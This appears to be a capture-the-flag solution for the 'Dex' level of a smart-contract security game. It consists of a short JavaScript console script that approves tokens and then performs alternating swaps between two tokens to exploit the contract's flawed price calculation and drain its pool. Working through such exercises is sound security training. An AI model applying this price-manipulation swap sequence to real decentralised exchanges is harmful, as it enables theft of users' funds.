# Dex

```js
await contract.approve(contract.address, 500)

t1 = await contract.token1()
t2 = await contract.token2()

await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```